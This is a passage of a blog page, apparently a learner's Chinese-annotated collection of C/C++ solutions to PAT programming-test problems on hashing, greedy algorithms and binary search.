if(str[i]==&#x27;P&#x27;)&#123;</span></span><br><span class="line"><span class="comment">            HashTable[0]++;</span></span><br><span class="line"><span class="comment">            sum++;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        else if(str[i]==&#x27;A&#x27;)&#123;</span></span><br><span class="line"><span class="comment">            HashTable[1]++;</span></span><br><span class="line"><span class="comment">            sum++;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        else if(str[i]==&#x27;T&#x27;)&#123;</span></span><br><span class="line"><span class="comment">            HashTable[2]++;</span></span><br><span class="line"><span class="comment">            sum++;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        else if(str[i]==&#x27;e&#x27;)&#123;</span></span><br><span class="line"><span class="comment">            HashTable[3]++;</span></span><br><span class="line"><span class="comment">            sum++;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        else if(str[i]==&#x27;s&#x27;)&#123;</span></span><br><span class="line"><span class="comment">            HashTable[4]++;</span></span><br><span class="line"><span class="comment">            sum++;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        else if(str[i]==&#x27;t&#x27;)&#123;</span></span><br><span class="line"><span class="comment">            HashTable[5]++;</span></span><br><span class="line"><span class="comment">            sum++;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    while(sum&gt;0)&#123;</span></span><br><span class="line"><span class="comment">        for(int i=0;i&lt;6;i++)&#123;</span></span><br><span class="line"><span class="comment">            if(HashTable[i]&gt;0)&#123;</span></span><br><span class="line"><span class="comment">                printf(&quot;%c&quot;,change[i]);</span></span><br><span class="line"><span class="comment">                HashTable[i]--;</span></span><br><span class="line"><span class="comment">                sum--;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT B1042</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int HashTable[256]=&#123;0&#125;;</span></span><br><span class="line"><span class="comment">    char str[1010];</span></span><br><span class="line"><span class="comment">    fgets(str,1010,stdin);   //用scanf不行</span></span><br><span class="line"><span class="comment">    int len=strlen(str);</span></span><br><span class="line"><span class="comment">    char c;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;len;i++)&#123;</span></span><br><span class="line"><span class="comment">        c=str[i];</span></span><br><span class="line"><span class="comment">        if(c&gt;=&#x27;a&#x27;&amp;&amp;c&lt;=&#x27;z&#x27;)&#123;</span></span><br><span class="line"><span class="comment">            HashTable[c]++;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        else if(c&gt;=&#x27;A&#x27;&amp;&amp;c&lt;=&#x27;Z&#x27;)&#123;</span></span><br><span class="line"><span class="comment">            c+=32;</span></span><br><span class="line"><span class="comment">            HashTable[c]++;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    int max = 0;</span></span><br><span class="line"><span class="comment">    char c2;</span></span><br><span class="line"><span class="comment">    for(int i=int(&#x27;a&#x27;);i&lt;=int(&#x27;z&#x27;);i++)&#123;</span></span><br><span class="line"><span class="comment">        if(max&lt;HashTable[i])&#123;</span></span><br><span class="line"><span class="comment">            max = HashTable[i];</span></span><br><span class="line"><span class="comment">            c2=i;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;%c %d&quot;,c2,max);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT A1092</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int HashTable[256]=&#123;0&#125;;</span></span><br><span class="line"><span class="comment">    char shop[1001];</span></span><br><span class="line"><span class="comment">    char buy[1001];</span></span><br><span class="line"><span class="comment">    //fgets(shop,1001,stdin);   不能读入空格</span></span><br><span class="line"><span class="comment">    //fgets(buy,1001,stdin);</span></span><br><span class="line"><span class="comment">    scanf(&quot;%s&quot;,shop);</span></span><br><span class="line"><span class="comment">    scanf(&quot;%s&quot;,buy);</span></span><br><span class="line"><span class="comment">    int len1=strlen(shop);</span></span><br><span class="line"><span class="comment">    int len2=strlen(buy);</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;len1;i++)&#123;</span></span><br><span class="line"><span class="comment">        HashTable[shop[i]]++;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    int miss=0;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;len2;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(HashTable[buy[i]]&gt;0) HashTable[buy[i]]--;</span></span><br><span class="line"><span class="comment">        else miss++;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    if(miss!=0)&#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;No %d&quot;,miss);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    else printf(&quot;Yes %d&quot;,len1-len2);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT B1005</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a&gt;b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> K;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;K);</span><br><span class="line">    <span class="keyword">int</span> n[<span class="number">101</span>];</span><br><span class="line">    <span class="keyword">int</span> m;</span><br><span class="line">    <span class="keyword">bool</span> HashTable[<span class="number">10000</span>]=&#123;<span class="literal">false</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;K;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;m);</span><br><span class="line">        n[i]=m;</span><br><span class="line">        <span class="keyword">while</span>(m!=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(m%<span class="number">2</span>==<span class="number">1</span>) m=(m*<span class="number">3</span>+<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">else</span> m/=<span class="number">2</span>;</span><br><span class="line">            HashTable[m]=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;K;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(HashTable[n[i]]==<span class="literal">false</span>)</span><br><span class="line">            count++;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(n,n+K,cmp);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;K;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(HashTable[n[i]]==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,n[i]);</span><br><span class="line">            count--;</span><br><span class="line">            <span class="keyword">if</span>(count&gt;<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT A1050</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    char str1[10005];</span></span><br><span class="line"><span class="comment">    char str2[10005];</span></span><br><span class="line"><span class="comment">    bool HashTable[128]=&#123;false&#125;;</span></span><br><span class="line"><span class="comment">    //fgets(str1,10001,stdin);</span></span><br><span class="line"><span class="comment">    //fgets(str2,10001,stdin);</span></span><br><span class="line"><span class="comment">    //int len1=strlen(str1);</span></span><br><span class="line"><span class="comment">    //int len2=strlen(str2);</span></span><br><span class="line"><span class="comment">    int len1=0,len2=0;</span></span><br><span class="line"><span class="comment">    while(true)&#123;</span></span><br><span class="line"><span class="comment">        str1[len1++]=getchar();</span></span><br><span class="line"><span class="comment">        if(str1[len1-1]==&#x27;\n&#x27;) break;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    while(true)&#123;</span></span><br><span class="line"><span class="comment">        str2[len2++]=getchar();</span></span><br><span class="line"><span class="comment">        if(str2[len2-1]==&#x27;\n&#x27;) break;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;len2;i++)&#123;</span></span><br><span class="line"><span class="comment">        HashTable[str2[i]]=true;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    //HashTable[13]=true;</span></span><br><span class="line"><span class="comment">    //HashTable[10]=true;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;len1;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(HashTable[str1[i]]==false)&#123;</span></span><br><span class="line"><span class="comment">            printf(&quot;%c&quot;,str1[i]);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1048 AC答案</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> HashTable[<span class="number">1001</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> N,M,temp;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;N,&amp;M);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;temp);</span><br><span class="line">        HashTable[temp]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;M;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(HashTable[i]&amp;&amp;HashTable[M-i])&#123;</span><br><span class="line">            <span class="keyword">if</span>(i==M-i&amp;&amp;HashTable[i]&lt;=<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>,i,M-i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No Solution&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT A1048  超时答案</span></span><br><span class="line"><span class="comment">bool cmp(int a,int b)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    return a&lt;b;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int N,M;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d%d&quot;,&amp;N,&amp;M);</span></span><br><span class="line"><span class="comment">    int n[N];</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;N;i++)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d&quot;,&amp;n[i]);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    sort(n,n+N,cmp);</span></span><br><span class="line"><span class="comment">    int i;</span></span><br><span class="line"><span class="comment">    for(i=0;i&lt;N-1;i++)&#123;</span></span><br><span class="line"><span class="comment">        for(int j=i+1;j&lt;N;j++)&#123;</span></span><br><span class="line"><span class="comment">            if(n[i]+n[j]==M)&#123;</span></span><br><span class="line"><span class="comment">                printf(&quot;%d %d&quot;,n[i],n[j]);</span></span><br><span class="line"><span class="comment">                return 0;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    if(i==N-1) printf(&quot;No Solution&quot;);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="4-4-1"><a href="#4-4-1" class="headerlink" title="4.4"></a>4.4</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1033 超难</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF=<span class="number">1000000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">station</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">double</span> per;</span><br><span class="line">    <span class="keyword">double</span> dis;</span><br><span class="line">&#125;now[<span class="number">510</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(station a,station b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a.dis!=b.dis) <span class="keyword">return</span> a.dis&lt;b.dis;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> a.per&lt;b.per;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> C,D,P;</span><br><span class="line">    <span class="keyword">int</span> N;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lf%lf%lf%d&quot;</span>,&amp;C,&amp;D,&amp;P,&amp;N);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lf%lf&quot;</span>,&amp;now[i].per,&amp;now[i].dis);</span><br><span class="line">    &#125;</span><br><span class="line">    now[N].per=<span class="number">0.0</span>;</span><br><span class="line">    now[N].dis=D;</span><br><span class="line">    sort(now,now+N,cmp);</span><br><span class="line">    <span class="keyword">if</span>(now[<span class="number">0</span>].dis!=<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;The maximum travel distance = 0.00&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> start=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">double</span> max_dis=C*P;</span><br><span class="line">        <span class="keyword">double</span> gas=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">double</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(start&lt;N)&#123;</span><br><span class="line">            <span class="keyword">int</span> k=<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">double</span> pricemin=INF;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=start+<span class="number">1</span>;i&lt;=N&amp;&amp;now[i].dis-now[start].dis&lt;=max_dis;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(now[i].per&lt;pricemin)&#123;</span><br><span class="line">                    pricemin=now[i].per;</span><br><span class="line">                    k=i;</span><br><span class="line">                    <span class="keyword">if</span>(pricemin&lt;now[start].per) <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(k==<span class="number">-1</span>) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">double</span> need =(now[k].dis-now[start].dis)/P;</span><br><span class="line">            <span class="keyword">if</span>(pricemin&lt;now[start].per)&#123;</span><br><span class="line">                <span class="keyword">if</span>(gas&lt;need)&#123;</span><br><span class="line">                    ans+=(need-gas)*now[start].per;</span><br><span class="line">                    gas=<span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> gas-=need;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                ans+=(C-gas)*now[start].per;</span><br><span class="line">                gas=C-need;</span><br><span class="line">            &#125;</span><br><span class="line">            start=k;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(start==N) <span class="built_in">printf</span>(<span class="string">&quot;%.2f&quot;</span>,ans);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;The maximum travel distance = %.2f&quot;</span>,now[start].dis+max_dis);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//system(&quot;pause&quot;);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1067</span></span><br><span class="line"><span class="comment">//思路还算不太难……但实现起来有点小吃力</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N);</span><br><span class="line">    <span class="keyword">int</span> pos[<span class="number">100001</span>];</span><br><span class="line">    <span class="keyword">int</span> change=N<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;temp);</span><br><span class="line">        pos[temp]=i;</span><br><span class="line">        <span class="keyword">if</span>(temp==i&amp;&amp;temp!=<span class="number">0</span>) change--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> k=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(change&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(pos[<span class="number">0</span>]==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(k&lt;N)&#123;</span><br><span class="line">                <span class="keyword">if</span>(pos[k]!=k)&#123;</span><br><span class="line">                    swap(pos[<span class="number">0</span>],pos[k]);</span><br><span class="line">                    ans++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                k++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(pos[<span class="number">0</span>]!=<span class="number">0</span>)&#123;</span><br><span class="line">            swap(pos[<span class="number">0</span>],pos[pos[<span class="number">0</span>]]);</span><br><span class="line">            ans++;</span><br><span class="line">            change--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT A1037</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int coupon[100001],product[100001];</span></span><br><span class="line"><span class="comment">    int n,m;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;n);</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d&quot;,&amp;coupon[i]);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;m);</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;m;i++)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d&quot;,&amp;product[i]);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    sort(coupon,coupon+n);</span></span><br><span class="line"><span class="comment">    sort(product,product+m);</span></span><br><span class="line"><span class="comment">    int i=0;</span></span><br><span class="line"><span class="comment">    int ans=0;</span></span><br><span class="line"><span class="comment">    while(i&lt;n&amp;&amp;i&lt;m&amp;&amp;coupon[i]&lt;0&amp;&amp;product[i]&lt;0)&#123;</span></span><br><span class="line"><span class="comment">        ans+=coupon[i]*product[i];</span></span><br><span class="line"><span class="comment">        i++;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    i=n-1;</span></span><br><span class="line"><span class="comment">    int j=m-1;</span></span><br><span class="line"><span class="comment">    while(i&gt;=0&amp;&amp;j&gt;=0&amp;&amp;coupon[i]&gt;0&amp;&amp;product[j]&gt;0)&#123;</span></span><br><span class="line"><span class="comment">        ans+=coupon[i]*product[j];</span></span><br><span class="line"><span class="comment">        i--;</span></span><br><span class="line"><span class="comment">        j--;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;%d&quot;,ans);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="4-5"><a href="#4-5" class="headerlink" title="4.5"></a>4.5</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1085</span></span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> a[<span class="number">100001</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> p;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%lld&quot;</span>,&amp;N,&amp;p);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    sort(a,a+N);</span><br><span class="line">    <span class="comment">//用upper_bound代替二分查找</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> j=upper_bound(a+i+<span class="number">1</span>,a+N,a[i]*p)-a;</span><br><span class="line">        ans=max(ans,j-i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
